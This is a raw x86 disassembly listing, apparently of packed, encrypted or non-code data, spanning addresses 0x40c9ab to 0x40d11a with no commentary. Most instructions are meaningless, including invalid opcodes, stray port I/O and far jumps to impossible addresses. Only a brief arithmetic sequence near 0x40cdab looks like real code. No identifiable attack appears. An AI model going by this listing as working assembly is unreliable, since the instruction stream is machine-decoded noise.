  40c9ab:	cmp    BYTE PTR [eax-0x1516c457],ch
  40c9b1:	push   ebx
  40c9b2:	fwait
  40c9b3:	popa   
  40c9b4:	mov    bl,BYTE PTR [eax+0x4d]
  40c9b7:	add    ah,ah
  40c9b9:	fsub   QWORD PTR [ebx+0x2c]
  40c9bc:	pop    es
  40c9bd:	(bad)  
  40c9be:	or     eax,0x7040a203
  40c9c3:	adc    ch,0x4a
  40c9c6:	pop    eax
  40c9c7:	jae    0x40c9d0
  40c9c9:	les    edi,FWORD PTR [ebp-0x38a5ab41]
  40c9cf:	push   0xdf141a57
  40c9d4:	loopne 0x40c970
  40c9d6:	add    eax,0xfe9e04bb
  40c9db:	test   DWORD PTR [esi-0x5bf16345],esi
  40c9e1:	and    cl,dh
  40c9e3:	mov    eax,ds:0xeb649755
  40c9e8:	dec    esp
  40c9e9:	mov    ecx,0x90fa8f2c
  40c9ee:	fmul   DWORD PTR [ecx-0x7f]
  40c9f1:	push   esi
  40c9f2:	xchg   ecx,eax
  40c9f3:	pusha  
  40c9f4:	sub    DWORD PTR [eax+0x5da1cd43],edx
  40c9fa:	and    ch,dh
  40c9fc:	ins    DWORD PTR es:[edi],dx
  40c9fd:	xor    al,0xb3
  40c9ff:	cmp    DWORD PTR [edx+0x42fd664a],edi
  40ca05:	mov    WORD PTR [ecx],?
  40ca07:	mov    bh,0xe
  40ca09:	or     ax,0xed31
  40ca0d:	add    ebp,DWORD PTR [edi+0x5a]
  40ca10:	rcr    BYTE PTR [edx+ebx*4+0x4f],0x62
  40ca15:	and    ebx,edi
  40ca17:	sub    ecx,edi
  40ca19:	jle    0x40ca47
  40ca1b:	mov    ch,0x91
  40ca1d:	and    al,al
  40ca1f:	or     ebx,DWORD PTR ds:0xec398446
  40ca25:	or     al,0x4b
  40ca27:	pop    eax
  40ca28:	pop    es
  40ca29:	and    eax,0xf399a4e6
  40ca2e:	inc    DWORD PTR [esp+eiz*8+0x7c]
  40ca32:	dec    ebx
  40ca33:	cmp    ecx,ecx
  40ca35:	ins    DWORD PTR es:[edi],dx
  40ca36:	and    BYTE PTR ds:0x568758d9,bh
  40ca3c:	jo     0x40ca1f
  40ca3e:	aas    
  40ca3f:	adc    al,0x6c
  40ca41:	mov    bh,0x38
  40ca43:	out    0xa3,al
  40ca45:	cld    
  40ca46:	add    BYTE PTR [ebp+0x4859ffd2],ah
  40ca4c:	iret   
  40ca4d:	icebp  
  40ca4e:	popf   
  40ca4f:	push   0xa6bc7ca0
  40ca54:	sbb    esp,edi
  40ca56:	stos   DWORD PTR es:[edi],eax
  40ca57:	sbb    ebp,DWORD PTR [esp+ecx*2]
  40ca5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca5b:	add    ah,ch
  40ca5d:	mov    al,0xaa
  40ca5f:	mov    al,ds:0x8707cb8f
  40ca64:	jo     0x40caab
  40ca66:	in     al,0xb2
  40ca68:	xchg   cl,ch
  40ca6a:	stos   BYTE PTR es:[edi],al
  40ca6b:	pushf  
  40ca6c:	xchg   esp,eax
  40ca6d:	ret    0x1b85
  40ca70:	cdq    
  40ca71:	ret    
  40ca72:	add    ch,BYTE PTR [eax-0x376291d3]
  40ca78:	mov    eax,0x91afb98
  40ca7d:	sbb    al,0x4c
  40ca7f:	paddusb mm5,QWORD PTR [ebx]
  40ca82:	imul   edx,DWORD PTR [ebx],0x1d1f0275
  40ca88:	inc    esp
  40ca89:	and    edx,esp
  40ca8b:	mov    edi,0x7aaea89
  40ca90:	test   BYTE PTR [ebp+0x18],dh
  40ca93:	fst    QWORD PTR cs:[eax]
  40ca96:	sub    cl,BYTE PTR [ebx-0x1e]
  40ca99:	or     ah,BYTE PTR [ebx-0xa536e2e]
  40ca9f:	inc    eax
  40caa0:	jp     0x40ca36
  40caa2:	(bad)  
  40caa3:	and    DWORD PTR [ecx],ebx
  40caa5:	mov    ecx,0xc7fd5aa4
  40caaa:	call   0xaa7c9c26
  40caaf:	jg     0x40ca3f
  40cab1:	mov    ah,0xe6
  40cab3:	repz push eax
  40cab5:	or     al,0xa3
  40cab7:	mov    edi,0x97952f5b
  40cabc:	call   0xf7b8:0xc9f8ea09
  40cac3:	pcmpeqd mm5,QWORD PTR [eax]
  40cac6:	lahf   
  40cac7:	xchg   ebx,eax
  40cac8:	mov    ds:0x5bfbfdcb,al
  40cacd:	push   ecx
  40cace:	fsubr  st(4),st
  40cad0:	test   eax,0xcf815165
  40cad5:	sub    edi,eax
  40cad7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cad8:	xor    al,BYTE PTR [eax-0x4c0160f]
  40cade:	inc    esp
  40cadf:	jg     0x621676aa
  40cae5:	cs cmps BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40cae8:	push   eax
  40cae9:	xchg   ebx,eax
  40caea:	aaa    
  40caeb:	dec    edx
  40caec:	retf   
  40caed:	lahf   
  40caee:	cmp    BYTE PTR [ebp+0x2ed15757],cl
  40caf4:	mov    al,ds:0xa2260fe7
  40caf9:	or     BYTE PTR [edi+0x6dd8d64e],ah
  40caff:	mov    bl,0xc8
  40cb01:	add    eax,0x996b0d9f
  40cb06:	stc    
  40cb07:	fdivr  st(3),st
  40cb09:	xchg   edx,eax
  40cb0a:	(bad)  
  40cb0b:	inc    ebp
  40cb0d:	pop    ds
  40cb0e:	std    
  40cb0f:	jo     0x40cae0
  40cb11:	mov    esi,0x95319f9c
  40cb16:	repz test eax,0x4a6788ae
  40cb1c:	nop
  40cb1d:	lock shr dh,0x43
  40cb21:	xor    edi,DWORD PTR [bx+si+0x20]
  40cb25:	icebp  
  40cb26:	fisubr WORD PTR [ebx]
  40cb28:	test   BYTE PTR [ebp+0x79f16dd3],bh
  40cb2e:	ds in  al,dx
  40cb30:	ficomp DWORD PTR [ebx]
  40cb32:	fisttp QWORD PTR [ecx]
  40cb34:	imul   ebx,DWORD PTR [ebx-0x63396a6c],0x62
  40cb3b:	imul   edx,eax,0x1e1c2efe
  40cb41:	call   0xbee88f8d
  40cb46:	inc    ecx
  40cb47:	pop    edx
  40cb48:	aaa    
  40cb49:	lahf   
  40cb4a:	rcr    bh,cl
  40cb4c:	lea    ebp,[eax]
  40cb4e:	rcl    BYTE PTR [ebx+ebx*4],0x77
  40cb52:	dec    edi
  40cb53:	(bad)  
  40cb54:	xchg   edx,eax
  40cb55:	out    dx,eax
  40cb56:	xor    al,0x88
  40cb58:	jmp    0x40cbc8
  40cb5a:	js     0x40cbd9
  40cb5c:	dec    edx
  40cb5d:	or     BYTE PTR [edx-0x61],ah
  40cb60:	adc    BYTE PTR [ebx],dl
  40cb62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb63:	or     al,0x8f
  40cb65:	mov    bh,0xd
  40cb67:	jecxz  0x40cbad
  40cb69:	jno    0x40caf4
  40cb6b:	loope  0x40cbac
  40cb6d:	xor    eax,0x35508188
  40cb72:	lea    esp,[edi-0x22969736]
  40cb78:	cmp    BYTE PTR [ecx],dh
  40cb7a:	inc    ebp
  40cb7b:	les    eax,FWORD PTR [edi+0x52]
  40cb7e:	loopne 0x40cb1b
  40cb80:	or     edi,DWORD PTR cs:[esi+0x4a2f6ec2]
  40cb87:	sub    ecx,0xffffffaa
  40cb8a:	push   edx
  40cb8b:	out    dx,eax
  40cb8c:	xlat   BYTE PTR ds:[ebx]
  40cb8d:	pop    es
  40cb8e:	loop   0x40cbc8
  40cb90:	out    dx,al
  40cb91:	dec    edi
  40cb92:	cmp    BYTE PTR [ebx],bh
  40cb94:	jmp    0xf0cb593c
  40cb99:	js     0x40cb94
  40cb9b:	xor    bh,BYTE PTR [eax-0x3214ba82]
  40cba1:	je     0x40cbd3
  40cba3:	scas   al,BYTE PTR es:[edi]
  40cba4:	mov    ecx,0xc39fff2d
  40cba9:	(bad)  
  40cbaa:	imul   esi,DWORD PTR [ecx+ecx*4],0xcb25fb74
  40cbb1:	dec    eax
  40cbb2:	(bad)  
  40cbb3:	mov    ebx,0x4d364ad6
  40cbb8:	mov    ah,0x81
  40cbba:	mov    al,ds:0x62e25a90
  40cbbf:	lock retf 0xf570
  40cbc3:	sar    DWORD PTR ds:0xfd4db333,cl
  40cbc9:	mov    al,0xa5
  40cbcb:	dec    edx
  40cbcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbcd:	call   0x78a4:0x37831a3c
  40cbd4:	dec    eax
  40cbd5:	inc    esi
  40cbd6:	cmp    BYTE PTR [ecx],dh
  40cbd8:	or     DWORD PTR [ebx+0x47dba33c],esi
  40cbde:	and    dh,0xc3
  40cbe1:	(bad)  
  40cbe2:	sub    eax,0xf74090cf
  40cbe7:	pop    edx
  40cbe8:	ja     0x40cbf9
  40cbea:	push   esi
  40cbeb:	popa   
  40cbec:	add    ebx,DWORD PTR [edi-0x6a36df8]
  40cbf2:	push   esp
  40cbf3:	jmp    0x4408:0x269ef081
  40cbfa:	push   ds
  40cbfb:	popa   
  40cbfc:	xchg   ecx,eax
  40cbfd:	inc    ebx
  40cbfe:	jnp    0x40cbc8
  40cc00:	xchg   ebp,eax
  40cc01:	mov    BYTE PTR [edx-0x24],dh
  40cc04:	ja     0x40cc39
  40cc06:	ret    0x3d94
  40cc09:	sbb    al,0xac
  40cc0b:	jo     0x40cc7e
  40cc0d:	and    eax,DWORD PTR [edi-0x5f]
  40cc10:	xor    edi,DWORD PTR [eax+0x5f]
  40cc13:	cmp    al,0xfa
  40cc15:	mov    dh,0x39
  40cc17:	enter  0x8876,0xb9
  40cc1b:	adc    BYTE PTR [ecx+eax*2+0x11d029b0],dl
  40cc22:	sub    BYTE PTR [eax+0x1d29312c],bh
  40cc28:	adc    eax,0x1f957d13
  40cc2d:	(bad)  
  40cc2e:	xchg   esp,eax
  40cc2f:	pop    ebp
  40cc30:	je     0x40cc7b
  40cc32:	retf   
  40cc33:	iret   
  40cc34:	fbld   TBYTE PTR [ecx]
  40cc36:	mov    al,ds:0xb5388395
  40cc3b:	lods   al,BYTE PTR ds:[esi]
  40cc3c:	fidiv  WORD PTR [ebp+edi*2-0x6870462b]
  40cc43:	(bad)  
  40cc44:	mov    ebp,0x1e84f8b8
  40cc49:	mov    WORD PTR [edx+edx*4],es
  40cc4c:	inc    edx
  40cc4d:	test   al,0xde
  40cc4f:	hlt    
  40cc50:	push   ecx
  40cc51:	add    DWORD PTR [esp+edx*1+0x5e],0xffffff9c
  40cc56:	out    dx,al
  40cc57:	jmp    0x40cca1
  40cc59:	cli    
  40cc5a:	sub    ecx,ecx
  40cc5c:	and    al,0xd0
  40cc5e:	fcomp  st(6)
  40cc60:	sbb    ebx,DWORD PTR [esi-0x5a]
  40cc63:	push   edx
  40cc64:	mov    bh,BYTE PTR [ebx+ebp*8+0x36bbe311]
  40cc6b:	pop    edx
  40cc6c:	jge    0x40cca7
  40cc6e:	ror    DWORD PTR [eax+0x218ab1ab],0x86
  40cc75:	div    DWORD PTR [eax]
  40cc77:	cmp    BYTE PTR [ebx+0x7c],dl
  40cc7a:	mov    eax,ds:0x4da9d906
  40cc7f:	jp     0x40cc03
  40cc81:	mov    cl,BYTE PTR [edi+0x651980d8]
  40cc87:	out    0x3,al
  40cc89:	sbb    BYTE PTR [ebx],dl
  40cc8b:	addr16 jnp 0x40cce5
  40cc8e:	call   0x91e8:0x4d599a67
  40cc95:	sbb    eax,0xd6e172f4
  40cc9a:	mov    cl,0x61
  40cc9c:	les    esp,FWORD PTR [edx+0x601254a4]
  40cca2:	clc    
  40cca3:	sbb    eax,0xeac903c0
  40cca8:	mov    cl,0x5d
  40ccaa:	fmul   DWORD PTR ds:0x227774d4
  40ccb0:	cmp    BYTE PTR [ecx],ah
  40ccb2:	stos   DWORD PTR es:[edi],eax
  40ccb3:	fild   QWORD PTR [edi+0x34]
  40ccb6:	std    
  40ccb7:	out    dx,al
  40ccb8:	or     BYTE PTR [esi+0x76],bl
  40ccbb:	mov    ebx,0xbf453c4
  40ccc0:	je     0x40cc70
  40ccc2:	or     bl,dh
  40ccc4:	jecxz  0x40cd36
  40ccc6:	icebp  
  40ccc7:	lea    edi,[ebx]
  40ccc9:	mov    ebx,0xb50b2b76
  40ccce:	dec    ecx
  40cccf:	push   ebp
  40ccd0:	pop    ss
  40ccd1:	mov    ch,0xb3
  40ccd3:	mov    edi,0xf46b4cb1
  40ccd8:	xchg   ecx,eax
  40ccd9:	xchg   ah,ah
  40ccdb:	push   esi
  40ccdc:	pop    es
  40ccdd:	mov    ch,0x6a
  40ccdf:	sahf   
  40cce0:	cwde   
  40cce1:	(bad)  
  40cce2:	jmp    0x3b1:0x65852a17
  40cce9:	iret   
  40ccea:	lods   eax,DWORD PTR ds:[esi]
  40cceb:	mov    cl,0xce
  40cced:	cdq    
  40ccee:	fwait
  40ccef:	jb     0x40cc73
  40ccf1:	iret   
  40ccf2:	ins    DWORD PTR es:[edi],dx
  40ccf3:	push   esi
  40ccf4:	mov    ch,0xa
  40ccf6:	mov    edx,0x4956d5a6
  40ccfb:	adc    eax,0x6cc3c280
  40cd00:	and    eax,0x8a6a84b9
  40cd05:	ja     0x40cd59
  40cd07:	xor    esp,DWORD PTR [eax-0x1c]
  40cd0a:	jb     0x40ccea
  40cd0c:	out    0xd1,eax
  40cd0e:	jge    0x40cca3
  40cd10:	mov    ebp,0x5f669aa4
  40cd15:	pop    esi
  40cd16:	not    ebx
  40cd18:	or     ebp,edi
  40cd1a:	test   eax,0x5770af38
  40cd1f:	jmp    0xc140dcac
  40cd24:	imul   ecx,DWORD PTR ds:0xe27aa7e7,0x7e
  40cd2b:	jp     0x40cd81
  40cd2d:	rol    dl,0x71
  40cd30:	and    DWORD PTR [ebx],edi
  40cd32:	and    esp,DWORD PTR [esi+0x6b4dd1e7]
  40cd38:	add    DWORD PTR [edx-0x298290bc],ecx
  40cd3e:	jmp    0x70ae:0x3151a68f
  40cd45:	push   ecx
  40cd46:	xlat   BYTE PTR ds:[ebx]
  40cd47:	mov    BYTE PTR [esi-0x991d56a],dl
  40cd4d:	inc    ecx
  40cd4e:	xchg   edx,eax
  40cd4f:	xor    eax,0xc2ff97dc
  40cd54:	sar    BYTE PTR [ebp-0x5a],0xcb
  40cd58:	jo     0x40cd74
  40cd5a:	js     0x40cd97
  40cd5c:	lods   eax,DWORD PTR ds:[esi]
  40cd5d:	ja     0x40cd3b
  40cd5f:	pop    ebx
  40cd60:	cwde   
  40cd61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd62:	add    dl,BYTE PTR [ebx-0x7]
  40cd65:	jnp    0x40cd52
  40cd67:	sbb    DWORD PTR [edi+0x61],ebx
  40cd6a:	or     al,0xe5
  40cd6c:	ss pop edx
  40cd6e:	jnp    0x40cd99
  40cd70:	pusha  
  40cd71:	fcom   DWORD PTR [ebx+eax*8]
  40cd74:	push   ecx
  40cd75:	pop    edi
  40cd76:	addr16 cmp eax,0xfba1cec0
  40cd7c:	outs   dx,DWORD PTR ds:[esi]
  40cd7d:	lock xor ah,BYTE PTR [edi+0x52e77a4a]
  40cd84:	mov    edx,0xf4c04366
  40cd89:	js     0x40cd5e
  40cd8b:	xchg   ebp,eax
  40cd8c:	add    BYTE PTR [eax-0x4264203c],cl
  40cd92:	loop   0x40cde6
  40cd94:	fwait
  40cd95:	sub    al,0x4b
  40cd97:	lahf   
  40cd98:	dec    ebx
  40cd99:	sub    bl,BYTE PTR [eax]
  40cd9b:	pushf  
  40cd9c:	test   BYTE PTR [ebx],ch
  40cd9e:	mov    ds:0x83862de,eax
  40cda3:	xor    ecx,DWORD PTR [eax+0x72991f94]
  40cda9:	xor    al,BYTE PTR [eax]
  40cdab:	mov    edx,DWORD PTR [ebp-0x44]
  40cdae:	mov    edi,DWORD PTR [ebp-0xc]
  40cdb1:	xor    edx,eax
  40cdb3:	xor    edi,eax
  40cdb5:	add    edx,ecx
  40cdb7:	add    edi,ecx
  40cdb9:	imul   edx,edi
  40cdbc:	add    edx,DWORD PTR [ebp-0x14]
  40cdbf:	mov    DWORD PTR [ebp-0x14],edx
  40cdc2:	mov    edx,DWORD PTR [ebp-0xc]
  40cdc5:	mov    edi,DWORD PTR [ebp-0x24]
  40cdc8:	jmp    0x40d1df
  40cdcd:	push   ebp
  40cdce:	and    DWORD PTR [edx+esi*8],eax
  40cdd1:	jl     0x40cdc6
  40cdd3:	jge    0x40cd76
  40cdd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdd6:	sbb    esi,DWORD PTR [eax+0x58]
  40cdd9:	xchg   ecx,eax
  40cdda:	shl    BYTE PTR [ebx-0x43],cl
  40cddd:	int3   
  40cdde:	sahf   
  40cddf:	jle    0x40ce5f
  40cde1:	jo     0x40ce5c
  40cde3:	jle    0x40ce63
  40cde5:	js     0x40ce20
  40cde7:	sbb    bl,bh
  40cde9:	aad    0xf9
  40cdeb:	int3   
  40cdec:	and    al,0xe3
  40cdee:	or     DWORD PTR [esi-0x454d3740],ebp
  40cdf4:	jbe    0x40ce60
  40cdf6:	stos   BYTE PTR es:[edi],al
  40cdf7:	push   0xe0297b8f
  40cdfc:	xor    DWORD PTR ds:0x9f2c7551,0x1b
  40ce03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce04:	adc    DWORD PTR [edi],edx
  40ce06:	fisub  DWORD PTR [edi]
  40ce08:	push   edx
  40ce09:	cmp    DWORD PTR [esi-0x496c8d03],0xffffffeb
  40ce10:	adc    ebp,DWORD PTR [ebx+0x51]
  40ce13:	out    dx,eax
  40ce14:	dec    edi
  40ce15:	add    eax,0x7457ba4
  40ce1a:	repnz mov ds:0x6c3b8fbf,al
  40ce20:	test   DWORD PTR [edi],ebx
  40ce22:	repz jp 0x40cdf6
  40ce25:	xchg   ecx,eax
  40ce26:	inc    edi
  40ce27:	adc    BYTE PTR fs:0xfeebc4e1,0xa8
  40ce2f:	data16 shl BYTE PTR [edx+ecx*2+0x1f124279],0x8f
  40ce38:	xor    dl,al
  40ce3a:	fs in  al,dx
  40ce3c:	dec    esi
  40ce3d:	pop    edx
  40ce3e:	int    0xda
  40ce40:	inc    eax
  40ce41:	and    al,0x48
  40ce43:	repnz push edx
  40ce45:	out    0xbd,eax
  40ce47:	sub    BYTE PTR [edi-0x51],bl
  40ce4a:	or     DWORD PTR [esp+ebx*8-0x59144b13],0x6e1d361d
  40ce55:	gs jl  0x40cde1
  40ce58:	cmp    eax,0xf5281b93
  40ce5d:	(bad)  
  40ce5e:	dec    esp
  40ce5f:	dec    esi
  40ce60:	jmp    0x4a422afc
  40ce65:	loope  0x40ce07
  40ce67:	(bad)  
  40ce68:	pop    ss
  40ce69:	mov    ch,BYTE PTR [ebp-0x36480ccc]
  40ce6f:	xchg   DWORD PTR [esi],ebx
  40ce71:	cmp    dh,ah
  40ce73:	(bad)  
  40ce74:	ss push esp
  40ce76:	pusha  
  40ce77:	pop    ebp
  40ce78:	push   esp
  40ce79:	int    0x75
  40ce7b:	sub    dh,BYTE PTR [ecx]
  40ce7d:	dec    esi
  40ce7e:	popf   
  40ce7f:	jge    0x40ceae
  40ce81:	mov    al,0x38
  40ce83:	scas   eax,DWORD PTR es:[edi]
  40ce84:	adc    ecx,DWORD PTR [eax+0x5a9970cc]
  40ce8a:	cmp    BYTE PTR [ebx+0xb],al
  40ce8d:	daa    
  40ce8e:	(bad)  
  40ce8f:	mov    esp,0xe1002b2
  40ce94:	loopne 0x40ce98
  40ce96:	mov    bl,0x70
  40ce98:	in     al,dx
  40ce99:	and    BYTE PTR [esi-0x5f],cl
  40ce9c:	adc    BYTE PTR [eax-0x78],cl
  40ce9f:	sbb    al,0x63
  40cea1:	jmp    0x40ce8f
  40cea3:	jl     0x40ce42
  40cea5:	or     edx,edx
  40cea7:	gs mov bh,0xdf
  40ceaa:	test   eax,0xa7e3f662
  40ceaf:	or     eax,0xa63c0ecf
  40ceb4:	fs sti 
  40ceb6:	push   esp
  40ceb7:	inc    ecx
  40ceb8:	or     al,0x12
  40ceba:	fisubr DWORD PTR [ebx+0x1c89357b]
  40cec0:	call   0xa20d1b9b
  40cec5:	xchg   DWORD PTR [edi],ebx
  40cec7:	es add al,0x18
  40ceca:	scas   ax,WORD PTR es:[edi]
  40cecc:	xchg   esi,eax
  40cecd:	push   eax
  40cece:	outs   dx,DWORD PTR ds:[esi]
  40cecf:	stos   BYTE PTR es:[edi],al
  40ced0:	mov    esi,0x3e9e598b
  40ced5:	fbstp  TBYTE PTR [ecx]
  40ced7:	push   edi
  40ced8:	sub    eax,0x8f0fc266
  40cedd:	mov    al,0x54
  40cedf:	ss pop ebx
  40cee1:	fistp  QWORD PTR [edx+0x3d]
  40cee4:	ficom  WORD PTR [esi]
  40cee6:	aaa    
  40cee7:	fisubr DWORD PTR [edi+0x38]
  40ceea:	outs   dx,DWORD PTR ds:[esi]
  40ceeb:	aas    
  40ceec:	xor    al,BYTE PTR [ecx+0x71]
  40ceef:	arpl   WORD PTR [edi],bx
  40cef1:	fwait
  40cef2:	sbb    eax,0x4675f2c9
  40cef7:	jmp    0x9b2f08ce
  40cefc:	pop    eax
  40cefd:	adc    dl,ah
  40ceff:	push   esp
  40cf00:	push   esi
  40cf01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf02:	xchg   edi,eax
  40cf03:	mov    eax,0x47e04c54
  40cf08:	mov    ebx,0x4bea524c
  40cf0d:	popa   
  40cf0e:	sub    ebx,DWORD PTR [eax]
  40cf10:	stc    
  40cf11:	pop    ecx
  40cf12:	fidivr DWORD PTR [edi-0x112c82fe]
  40cf18:	arpl   sp,si
  40cf1a:	aas    
  40cf1b:	int3   
  40cf1c:	fmul   DWORD PTR [edi]
  40cf1e:	daa    
  40cf1f:	fstp   QWORD PTR [edx-0x27b89981]
  40cf25:	leave  
  40cf26:	cld    
  40cf27:	jle    0x40cf8d
  40cf29:	jae    0x40cee2
  40cf2b:	fmul   DWORD PTR [ebp-0x53d48f09]
  40cf31:	loopne 0x40cfa6
  40cf33:	xchg   edx,eax
  40cf34:	adc    DWORD PTR [eax*2-0x5c32b304],esi
  40cf3b:	lea    eax,[ebx+0x61]
  40cf3e:	cli    
  40cf3f:	in     al,dx
  40cf40:	sbb    BYTE PTR ds:0x3fd69ae1,dh
  40cf46:	sub    dh,dl
  40cf48:	aad    0x3c
  40cf4a:	jae    0x40cf5a
  40cf4c:	add    ecx,DWORD PTR [eax-0x49]
  40cf4f:	mov    ch,0xea
  40cf51:	(bad)  
  40cf53:	lds    esp,FWORD PTR [eax-0x57bfdc3f]
  40cf59:	loopne 0x40cf6e
  40cf5b:	dec    eax
  40cf5c:	sbb    eax,0x85d4a216
  40cf61:	push   esi
  40cf62:	dec    BYTE PTR [esp+eax*4]
  40cf65:	inc    ecx
  40cf66:	stos   BYTE PTR es:[edi],al
  40cf67:	retf   
  40cf68:	out    dx,al
  40cf69:	dec    ebx
  40cf6a:	cmp    al,0x9
  40cf6c:	push   0x2a
  40cf6e:	aam    0xe0
  40cf70:	out    dx,al
  40cf71:	in     al,dx
  40cf72:	lea    ebp,[edx-0x3992246c]
  40cf78:	cwde   
  40cf79:	mov    al,0x42
  40cf7b:	pop    edx
  40cf7c:	cld    
  40cf7d:	add    BYTE PTR [edx],0x58
  40cf80:	push   ds
  40cf81:	sbb    eax,0xe995f060
  40cf86:	jle    0x40cf27
  40cf88:	jbe    0x40cf27
  40cf8a:	hlt    
  40cf8b:	push   esi
  40cf8c:	(bad)  
  40cf8d:	out    dx,eax
  40cf8e:	push   0x29
  40cf90:	shr    DWORD PTR [ebx+edi*1],cl
  40cf93:	or     DWORD PTR [ebx],esi
  40cf95:	fcom   QWORD PTR [edx]
  40cf97:	call   0xeb20e4ab
  40cf9c:	xchg   esp,eax
  40cf9d:	jp     0x40cfbe
  40cf9f:	gs dec ebp
  40cfa1:	mov    ch,dl
  40cfa3:	sar    DWORD PTR [eax],0x8c
  40cfa6:	and    DWORD PTR [ecx+edi*2-0x42984650],ebp
  40cfad:	dec    DWORD PTR [ecx+eax*4-0x16c77950]
  40cfb4:	jle    0x40d009
  40cfb6:	out    0xd5,al
  40cfb8:	push   eax
  40cfb9:	das    
  40cfba:	inc    ecx
  40cfbb:	mov    ecx,0xd865129c
  40cfc0:	mov    dh,0xb3
  40cfc2:	pop    edx
  40cfc3:	mov    dl,0x62
  40cfc5:	xor    al,0xb4
  40cfc7:	cmp    ah,BYTE PTR ds:0x91f2e724
  40cfcd:	xchg   BYTE PTR [edx+0x1326a7a9],ah
  40cfd3:	cmp    al,0xa3
  40cfd5:	sub    al,0xc2
  40cfd7:	out    dx,al
  40cfd8:	adc    al,0x77
  40cfda:	mov    ch,0x2e
  40cfdc:	int3   
  40cfdd:	fisttp QWORD PTR [edi-0x6212ad1d]
  40cfe3:	sahf   
  40cfe4:	xchg   ebx,eax
  40cfe5:	ret    0xc2c2
  40cfe8:	mov    eax,ds:0xb38c866c
  40cfed:	cmc    
  40cfee:	sbb    DWORD PTR [edi],eax
  40cff0:	or     eax,0x8802f684
  40cff5:	out    0x95,eax
  40cff7:	mov    ch,0xf3
  40cff9:	outs   dx,BYTE PTR ds:[esi]
  40cffa:	neg    BYTE PTR [edi+eiz*1]
  40cffd:	xor    eax,0xc7b22dbf
  40d002:	inc    edx
  40d003:	iret   
  40d004:	call   0xa0e:0x119e5321
  40d00b:	and    edx,esp
  40d00d:	fwait
  40d00e:	xor    BYTE PTR [esi-0x44],ah
  40d011:	and    ebp,DWORD PTR [ecx-0x42]
  40d014:	cmp    BYTE PTR [ebp+edi*2-0x3aa2c082],dh
  40d01b:	push   ebp
  40d01c:	dec    eax
  40d01d:	es cmp eax,0x3ea8b628
  40d023:	neg    BYTE PTR [ecx+0x56]
  40d026:	sti    
  40d027:	aas    
  40d028:	ins    BYTE PTR es:[edi],dx
  40d029:	loopne 0x40cffd
  40d02b:	cmp    DWORD PTR [ebp+0x2093138f],edi
  40d031:	jecxz  0x40d035
  40d033:	cmp    al,0xb4
  40d035:	aad    0x96
  40d037:	fidiv  WORD PTR [esp+ebx*2+0x25d72ec]
  40d03e:	test   cl,ah
  40d040:	lods   eax,DWORD PTR ds:[esi]
  40d041:	mov    bl,0xcf
  40d043:	imul   ecx,esp,0xfffffffb
  40d046:	aaa    
  40d047:	jecxz  0x40cfc9
  40d049:	push   0x8198a1a9
  40d04e:	cdq    
  40d04f:	jp     0x40cffa
  40d051:	popa   
  40d052:	sbb    eax,0x6440f51e
  40d057:	aaa    
  40d058:	cdq    
  40d059:	push   esi
  40d05a:	(bad)  
  40d05b:	arpl   WORD PTR [esi+0x1e1ed09c],cx
  40d061:	shl    DWORD PTR ss:[ecx+0x56],0x5f
  40d066:	xor    al,0xb2
  40d068:	pop    ecx
  40d069:	push   ebx
  40d06a:	scas   eax,DWORD PTR es:[edi]
  40d06b:	imul   eax,DWORD PTR [ecx+0x65aa7795],0x202d2853
  40d075:	lahf   
  40d076:	pop    ecx
  40d077:	push   ebx
  40d078:	add    eax,0xa1ef91c3
  40d07d:	imul   esi,esp,0xffffff8c
  40d080:	push   ds
  40d081:	fldenv [edx-0x3a]
  40d084:	data16 jae 0x40d0bb
  40d087:	enter  0xac02,0xa2
  40d08b:	mov    edi,esi
  40d08d:	sbb    bh,bh
  40d08f:	ret    
  40d090:	lods   eax,DWORD PTR ds:[esi]
  40d091:	xlat   BYTE PTR ds:[ebx]
  40d092:	cmp    esp,ecx
  40d094:	dec    edi
  40d095:	lahf   
  40d096:	fsub   QWORD PTR [edi+0x5b424cc5]
  40d09c:	stos   BYTE PTR es:[edi],al
  40d09d:	inc    ebx
  40d09e:	jecxz  0x40d025
  40d0a0:	adc    bl,ah
  40d0a2:	jnp    0x40d061
  40d0a4:	jp     0x40d0bd
  40d0a6:	lea    edi,[eax+0x75]
  40d0a9:	outs   dx,BYTE PTR ds:[esi]
  40d0aa:	stos   DWORD PTR es:[edi],eax
  40d0ab:	cdq    
  40d0ac:	jbe    0x40d0e6
  40d0ae:	cmp    eax,0xa9ac996d
  40d0b3:	cmp    ecx,DWORD PTR [eax-0xb]
  40d0b6:	sub    eax,0xf15b0ca5
  40d0bb:	mov    edi,0x815152f7
  40d0c0:	leave  
  40d0c1:	shl    ebx,1
  40d0c3:	arpl   WORD PTR [eax+ebx*1-0x6a],ax
  40d0c7:	jle    0x40d0b0
  40d0c9:	rol    BYTE PTR [ebp-0x3ea68a07],0xe5
  40d0d0:	aam    0x5e
  40d0d2:	pop    ss
  40d0d3:	in     al,0x68
  40d0d5:	and    eax,DWORD PTR [ebp+0x62ceedc]
  40d0db:	adc    DWORD PTR [edi-0x28],esp
  40d0de:	out    0x48,eax
  40d0e0:	ins    DWORD PTR es:[edi],dx
  40d0e1:	inc    ebp
  40d0e2:	sbb    eax,DWORD PTR [ebp-0x5e]
  40d0e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0e6:	sahf   
  40d0e7:	sub    di,di
  40d0ea:	push   ecx
  40d0eb:	and    dl,BYTE PTR [ebx-0x5d98d7cf]
  40d0f1:	jbe    0x40d16d
  40d0f3:	mov    BYTE PTR [edi-0x66a3f289],ch
  40d0f9:	scas   eax,DWORD PTR es:[edi]
  40d0fa:	in     eax,dx
  40d0fb:	dec    ebp
  40d0fc:	xor    DWORD PTR [ebx],0x1adc0f6b
  40d102:	cld    
  40d103:	or     BYTE PTR [edx],0xb4
  40d106:	xor    DWORD PTR [ebp+0x7b0aae9e],esi
  40d10c:	pop    ebx
  40d10d:	and    DWORD PTR [edx-0x48],esp
  40d110:	or     cl,cl
  40d112:	mov    eax,0xd725974c
  40d117:	das    
  40d118:	bound  edx,QWORD PTR [edx]
  40d11a:	add    ah,bh
